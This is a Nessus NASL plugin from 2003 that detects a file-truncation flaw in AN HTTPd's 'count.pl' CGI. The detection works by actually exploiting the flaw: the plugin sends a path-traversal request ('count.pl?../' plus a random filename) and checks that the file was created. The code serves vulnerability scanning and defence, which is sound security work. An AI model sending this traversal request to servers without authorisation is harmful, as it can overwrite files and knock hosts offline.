#
# This script was written by Renaud Deraison
#
#
# Ref:
# From: "Matthew Murphy" <mattmurphy@kc.rr.com>
# To: "BugTraq" <bugtraq@securityfocus.com>
# Subject: AN HTTPd Sample Script File Truncation
# Date: Mon, 21 Apr 2003 17:24:46 -0500


if(description)
{
 script_id(11555);
 script_bugtraq_id(7397);
 script_version ("$Revision: 1.5 $");
 name["english"] = "AN HTTPd count.pl file truncation";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote web server is running a CGI called 'count.pl' which may be used 
by an attacker to overwrite any existing file on the remote server, with
the privileges of the httpd server.

An attacker may use this flaw to prevent this host from working properly.

Solution : Delete /isapi/count.pl
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Creates a file on the remote server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nes", "http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

if ( report_paranoia < 2 ) exit(0);

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

file = "nessus-" + rand() + "-" + rand();

req = http_get(item:"/isapi/" + file, port:port);
res = http_keepalive_send_recv(port:port, data:req);
if(res == NULL ) exit(0);

res = strstr(res, string("\r\n\r\n"));
if("1" >< res) exit(0); # Exists already ?!

req = http_get(item:"/isapi/count.pl?../" + file, port:port);
res = http_keepalive_send_recv(port:port, data:req);
if(res == NULL ) exit(0);

req = http_get(item:"/isapi/" + file, port:port);
res = http_keepalive_send_recv(port:port, data:req);
if(res == NULL ) exit(0);

res = strstr(res, string("\r\n\r\n"));
if("1" >< res) security_hole(port);
